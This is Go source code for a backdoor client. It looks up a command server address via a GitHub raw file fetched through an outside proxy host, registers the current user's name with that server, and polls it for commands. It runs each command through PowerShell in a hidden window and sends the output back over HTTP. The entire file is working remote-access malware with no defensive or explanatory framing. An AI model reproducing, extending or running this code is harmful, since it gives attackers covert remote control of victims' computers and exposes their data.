package main

import (
	"time"
	"io/ioutil"
	"net/http"
	"os/exec"
	"os/user"
	"strings"
	"syscall"
)

func main() {
	urlx := ""
	for true {
		result, urlxx := getmasterserver()
		if len(string(result)) == 0 || strings.Contains(result,"not found") {
			continue
		} else {
			urlx = urlxx
			//fmt.Println("server found! " + urlx)
			username := getusername()
			for true {
				command, err := reciver(urlx + "/recv/" + username)
				if err != nil {
					continue
				} else {
					if strings.TrimSpace(command) == "None" {
						continue
					} else if strings.TrimSpace(command) == "" {
						break
					} else {
						excute(command, urlx)
					}
				}

			}
		}
	}

}

func getmasterserver() (string, string) {
	
	urlx, _ := reciver(string("http://rawgitsuck.tk/raw?git=https://raw.githubusercontent.com/ScRiPt1337/Ashwatthama/master/urlx.txt"))
	
	urlx = strings.TrimSpace(strings.Split(urlx, "\n")[0])
	username := getusername()
	add := string(urlx + string("/add/") + username)
	result, _ := reciver(add)
	return result, urlx
}

func sendoutput(urlx string, stdout string, err error) {
	if err != nil {
		return
	}
	//fmt.Println(string(stdout))
	sendresponse(urlx, stdout)
}

func excute(command string, urlx string) {

	//cmd := exec.Command("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",command)
	cmd := exec.Command("powershell", "/C", command)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd_output, err := cmd.Output()
	sendoutput(urlx, string(cmd_output), err)

}

func getusername() string {
	userx, err := user.Current()
	if err != nil {
		panic(err)
	}
	return strings.Split(userx.Username, "\\")[1]
}

func sendresponse(urlx string, response string) {
	_, err := http.Post(urlx+"/response", "application/text", strings.NewReader(response))
	if err != nil {
		return
	}

}

func httpreq(urlx string) (string, error){
	resp, err := http.Get(urlx)
	if err != nil {
		return err.Error(), err
	}

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return err.Error(), err
	}
	return string(body), err
}

func reciver(urlx string) (string, error) {
	if strings.Contains(urlx, "ngrok.io"){
		body,err := httpreq(urlx)
		time.Sleep(3 * time.Second)
		return string(body), err
	}else{
		body,err := httpreq(urlx)
		return string(body), err
	}
}
